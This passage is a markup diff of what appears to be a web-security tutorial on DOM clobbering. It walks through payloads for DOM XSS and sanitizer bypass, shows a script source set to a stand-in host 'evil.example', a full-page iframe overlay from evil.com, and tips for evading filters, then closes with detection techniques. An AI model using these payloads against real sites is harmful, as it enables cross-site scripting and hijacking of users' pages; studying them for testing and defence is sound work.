-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(window.<span style="color:#a6e22e">sanitize</span>); <span style="color:#75715e">// logs the &lt;form&gt; element instead — calling sanitize() now breaks
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><h4 id="5-dom-based-xss-via-clobbering">
-  5. DOM-Based XSS via Clobbering
-  <a class="anchor" href="#5-dom-based-xss-via-clobbering">#</a>
-</h4>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(window.<span style="color:#a6e22e">sanitize</span>); <span style="color:#75715e">// logs the &lt;form&gt; element instead — calling sanitize() now breaks
+</span></span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><h4 id="5-dom-based-xss-via-clobbering">5. DOM-Based XSS via Clobbering<a class="anchor" href="#5-dom-based-xss-via-clobbering">#</a></h4>
 <p>Chain the above into an actual DOM XSS: clobber a variable that later gets written into <code>innerHTML</code>.</p>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cfg&#34;</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cfg&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;html&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;img src=x onerror=alert(1)&gt;&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;id_name&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">html</span>.<span style="color:#a6e22e">value</span>;
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// cfg.html.value is fully attacker-controlled, and it&#39;s about to become live HTML
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><h4 id="6-url--resource-manipulation">
-  6. URL / Resource Manipulation
-  <a class="anchor" href="#6-url--resource-manipulation">#</a>
-</h4>
+</span></span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><h4 id="6-url--resource-manipulation">6. URL / Resource Manipulation<a class="anchor" href="#6-url--resource-manipulation">#</a></h4>
 <p>Override variables later used in <code>script.src</code>, <code>iframe.src</code>, <code>img.src</code>, or redirects so the app loads attacker-chosen resources.</p>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;settings&#34;</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;settings&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cdn&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//evil.example/payload.js&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">settings</span>.<span style="color:#a6e22e">cdn</span>.<span style="color:#a6e22e">value</span>; <span style="color:#75715e">// the app thinks this is a trusted CDN URL
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><h4 id="7-collection-clobbering">
-  7. Collection Clobbering
-  <a class="anchor" href="#7-collection-clobbering">#</a>
-</h4>
+</span></span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><h4 id="7-collection-clobbering">7. Collection Clobbering<a class="anchor" href="#7-collection-clobbering">#</a></h4>
 <p>If the app expects <code>document.forms.login</code> to be a single form, but you inject two forms with the same <code>name</code>, it becomes a collection instead of one element. Code that assumed a single object (e.g. calling <code>.submit()</code> directly) may now break, misbehave, or hit an unexpected code path.</p>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(document.<span style="color:#a6e22e">forms</span>.<span style="color:#a6e22e">login</span>); <span style="color:#75715e">// an HTMLCollection of 2, not a single form
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><h4 id="8-filter-bypass-via-attribute-clobbering">
-  8. Filter Bypass via Attribute Clobbering
-  <a class="anchor" href="#8-filter-bypass-via-attribute-clobbering">#</a>
-</h4>
+</span></span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><h4 id="8-filter-bypass-via-attribute-clobbering">8. Filter Bypass via Attribute Clobbering<a class="anchor" href="#8-filter-bypass-via-attribute-clobbering">#</a></h4>
 <p>This is the trick worth understanding well, because it defeats client-side sanitizers directly. Say the app has JavaScript that loops through an element&rsquo;s attributes to strip dangerous ones:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">el</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;target&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">el</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;target&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">el</span>.<span style="color:#a6e22e">attributes</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">el</span>.<span style="color:#a6e22e">attributes</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">name</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>This assumes <code>el.attributes</code> is always the browser&rsquo;s real, built-in attribute list. But <code>.attributes</code> is just a property name - and property names can be clobbered like anything else:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;target&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>This assumes <code>el.attributes</code> is always the browser&rsquo;s real, built-in attribute list. But <code>.attributes</code> is just a property name - and property names can be clobbered like anything else:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;target&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;attributes&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
-</span></span></code></pre></div><p>Now <code>document.getElementById(&quot;target&quot;).attributes</code> resolves to the injected <code>&lt;input&gt;</code> instead of the real attribute list. The loop above either breaks or iterates over nothing - either way, whatever filtering it was supposed to do never runs. The same trick works against other property names filters commonly rely on: <code>.tagName</code>, <code>.nodeName</code>, <code>.parentNode</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x&#34;</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;</span></span></code></pre></div><p>Now <code>document.getElementById(&quot;target&quot;).attributes</code> resolves to the injected <code>&lt;input&gt;</code> instead of the real attribute list. The loop above either breaks or iterates over nothing - either way, whatever filtering it was supposed to do never runs. The same trick works against other property names filters commonly rely on: <code>.tagName</code>, <code>.nodeName</code>, <code>.parentNode</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x&#34;</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;y&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nodeName&#34;</span> /&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;x&#34;</span>).<span style="color:#a6e22e">nodeName</span>) <span style="color:#75715e">// &#34;FORM&#34; — normal, untouched
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;y&#34;</span>).<span style="color:#a6e22e">nodeName</span>) <span style="color:#75715e">// &#34;[object HTMLInputElement]&#34; — clobbered
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><p><strong>Variations to try if the first attempt doesn&rsquo;t land:</strong></p>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;y&#34;</span>).<span style="color:#a6e22e">nodeName</span>) <span style="color:#75715e">// &#34;[object HTMLInputElement]&#34; — clobbered
+</span></span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><p><strong>Variations to try if the first attempt doesn&rsquo;t land:</strong></p>
 <ul>
 <li>Swap <code>id</code> for <code>name</code>, or try both together</li>
 <li>Nest the clobbering element inside another (<code>&lt;form name=config&gt;&lt;input name=url ...&gt;</code>)</li>
 <li>Try different casing (<code>CONFIG</code>, <code>Config</code>) in case the app&rsquo;s lookup is case-sensitive in a way that helps you</li>
 <li>HTML-entity or Unicode-encode parts of your payload if a WAF or filter is blocking the literal string</li>
 </ul>
-<h4 id="9-clobbering-forms">
-  9. Clobbering Forms
-  <a class="anchor" href="#9-clobbering-forms">#</a>
-</h4>
+<h4 id="9-clobbering-forms">9. Clobbering Forms<a class="anchor" href="#9-clobbering-forms">#</a></h4>
 <p>It’s possible to add <strong>new entries inside a form</strong> just by <strong>specifying the <code>form</code> attribute</strong> inside some tags. You can use this to <strong>add new values inside a form</strong> and to even add a new <strong>button</strong> to <strong>send it</strong> (clickjacking or abusing some <code>.click()</code> JS code):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--Add a new attribute and a new button to send--&gt;</span>
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">textarea</span> <span style="color:#a6e22e">form</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;id-other-form&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;info&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>&#34;;alert(1);//
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">textarea</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">form</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;id-other-form&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">formaction</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/edit&#34;</span> <span style="color:#a6e22e">formmethod</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>  Click to send!
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">button</span>&gt;
-</span></span></code></pre></div><p>This lets you inject a brand-new field into an existing form, and even add your own submit button pointing at a different action/method - useful for clickjacking-style tricks or smuggling extra parameters into a legitimate form submission.</p>
-<h2 id="advanced-attack-scenarios">
-  Advanced Attack Scenarios
-  <a class="anchor" href="#advanced-attack-scenarios">#</a>
-</h2>
-<h4 id="1-inject-iframe-to-hijack-ui">
-  <strong>1. Inject <code>&lt;iframe&gt;</code> to Hijack UI</strong>
-  <a class="anchor" href="#1-inject-iframe-to-hijack-ui">#</a>
-</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a1&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">button</span>&gt;</span></span></code></pre></div><p>This lets you inject a brand-new field into an existing form, and even add your own submit button pointing at a different action/method - useful for clickjacking-style tricks or smuggling extra parameters into a legitimate form submission.</p>
+<h2 id="advanced-attack-scenarios">Advanced Attack Scenarios<a class="anchor" href="#advanced-attack-scenarios">#</a></h2>
+<h4 id="1-inject"><strong>1. Inject <code>&lt;iframe&gt;</code> to Hijack UI</strong><a class="anchor" href="#1-inject">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a1&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">a1</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;iframe id=&#34;foo&#34; src=&#34;https://evil.com&#34; style=&#34;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;&#34;&gt;&lt;/iframe&gt;`</span>;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><p>If your injected HTML reaches an <code>innerHTML</code> sink, you&rsquo;re not limited to clobbering - you can paint a full-page iframe over the real content, effectively taking over what the user sees.</p>
-<h4 id="2-override-submit-behavior">
-  2. Override Submit Behavior
-  <a class="anchor" href="#2-override-submit-behavior">#</a>
-</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Use to Override submit Behavior
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><p>If your injected HTML reaches an <code>innerHTML</code> sink, you&rsquo;re not limited to clobbering - you can paint a full-page iframe over the real content, effectively taking over what the user sees.</p>
+<h4 id="2-override-submit-behavior">2. Override Submit Behavior<a class="anchor" href="#2-override-submit-behavior">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Use to Override submit Behavior
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a2&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">a2</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;form id=&#34;submit&#34; action=&#34;javascript:alert(&#39;Submit hijacked&#39;)&#34;&gt;&lt;/form&gt;`</span>;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">submit</span>.<span style="color:#a6e22e">submit</span>(); <span style="color:#75715e">// Triggers alert
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><h4 id="3-manipulating-history-api">
-  3. Manipulating History API
-  <a class="anchor" href="#3-manipulating-history-api">#</a>
-</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a4&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><h4 id="3-manipulating-history-api">3. Manipulating History API<a class="anchor" href="#3-manipulating-history-api">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a4&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">a4</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;form id=&#34;history&#34;&gt;&lt;/form&gt;`</span>;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">pushState</span>({}, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;/clobbered&#39;</span>); <span style="color:#75715e">// &#34;history&#34; is now your form element, not the real History API object
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><p>If any later code expects <code>history</code> to be the browser&rsquo;s real History API and calls a method on it, it will break or misbehave, since it&rsquo;s now pointing at your form.</p>
-<h4 id="4-sandbox-escape-via-form-clobbering">
-  4. Sandbox Escape via form Clobbering
-  <a class="anchor" href="#4-sandbox-escape-via-form-clobbering">#</a>
-</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">sandbox</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a8&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><p>If any later code expects <code>history</code> to be the browser&rsquo;s real History API and calls a method on it, it will break or misbehave, since it&rsquo;s now pointing at your form.</p>
+<h4 id="4-sandbox-escape-via-form-clobbering">4. Sandbox Escape via form Clobbering<a class="anchor" href="#4-sandbox-escape-via-form-clobbering">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">sandbox</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a8&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">a8</span>.<span style="color:#a6e22e">contentWindow</span>.document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#39;&lt;form id=&#34;window&#34;&gt;&lt;/form&gt;&lt;script&gt;console.log(window.top)//&lt;/script&gt;&#39;</span>);
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h4 id="manual">
-  Manual
-  <a class="anchor" href="#manual">#</a>
-</h4>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h4 id="manual">Manual<a class="anchor" href="#manual">#</a></h4>
 <p>Three things to look for while reading source code or testing a target:</p>
 <ol>
 <li><strong>Code that reads a global variable without checking its type.</strong> Look for patterns like <code>var x = window.foo</code> where nothing verifies <code>foo</code> is actually the expected object before using it.</li>
 <li><strong>Any point where you can inject raw HTML</strong>, even something as simple as <code>&lt;h1&gt;foobar&lt;/h1&gt;</code> landing unescaped in the page. You don&rsquo;t need script execution to prove clobbering is possible - just HTML injection.</li>
 <li><strong>Filters that loop over DOM properties</strong>, such as:</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">attributes</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">attributes</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">attr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">attributes</span>[<span style="color:#a6e22e">i</span>];
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isBlacklisted</span>(<span style="color:#a6e22e">attr</span>.<span style="color:#a6e22e">name</span>)) {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">removeAttribute</span>(<span style="color:#a6e22e">attr</span>.<span style="color:#a6e22e">name</span>);
 </span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Any loop like this is a candidate for the <code>.attributes</code> clobbering bypass shown above.</p>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>Any loop like this is a candidate for the <code>.attributes</code> clobbering bypass shown above.</p>
 <p><strong>Practical workflow:</strong> find your HTML injection point, then open the browser console and try <code>window.&lt;candidate-name&gt;</code> for names you&rsquo;d expect the app to use (<code>config</code>, <code>settings</code>, <code>app</code>, <code>sanitize</code>, etc.) after injecting a simple <code>&lt;form id=&quot;candidate-name&quot;&gt;</code>. If it resolves to your form instead of <code>undefined</code>, you&rsquo;ve confirmed the clobbering primitive works - now trace where that variable is actually used in the app&rsquo;s code to figure out real impact.</p>
-<h4 id="automated">
-  Automated
-  <a class="anchor" href="#automated">#</a>
-</h4>
+<h4 id="automated">Automated<a class="anchor" href="#automated">#</a></h4>
 <ul>
 <li><strong>Burp Suite&rsquo;s DOM Invader</strong> (built-in extension)  purpose-built for finding DOM Clobbering and DOM XSS, flags clobberable sinks automatically as you browse</li>
 <li><strong>Chrome DevTools</strong>  manually inspect <code>window</code> object properties after injecting test payloads, to confirm what&rsquo;s clobbered and what isn&rsquo;t</li>
 </ul>
-<h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
